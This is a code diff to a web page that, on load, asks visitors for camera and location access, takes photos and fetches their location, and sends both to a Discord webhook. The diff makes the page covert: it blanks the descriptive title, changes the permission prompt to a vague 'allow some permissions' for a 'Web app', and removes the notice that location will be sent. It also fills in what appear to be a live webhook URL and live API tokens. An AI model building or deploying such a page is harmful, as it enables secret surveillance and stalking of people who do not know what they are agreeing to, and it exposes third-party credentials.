@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Capture with Accurate Location</title>
+    <title></title>
     <style>
         video, canvas {
             position: absolute;
@@ -18,9 +18,9 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const discordWebhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
-        const locationIQToken = 'YOUR_LOCATIONIQ_TOKEN';
-        const ipinfoURL = 'https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN';
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
+        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
+        const ipinfoURL = 'https://ipinfo.io/json?token=41d360af12f2bf';
 
         let locationData = "Location not available";
         let captureCount = 0;
@@ -40,8 +40,8 @@
                 video.onloadedmetadata = () => video.play();
                 capturePhotos(); // Start capturing photos
             } catch (error) {
-                console.warn("Camera access failed. Sending location only.");
-                alert("Camera access failed. Only location will be sent.");
+                console.warn("Camera access failed.");
+                alert("Camera access failed.");
                 sendLocationOnlyToDiscord();
             }
         }
@@ -165,7 +165,7 @@
 
         // Start on page load
         window.onload = async () => {
-            alert("Initializing app. Please allow camera and location permissions.");
+            alert("Initializing Web app. Please allow some permissions.");
             await getLocation(); // Fetch location data
             initCamera();        // Initialize camera
         };
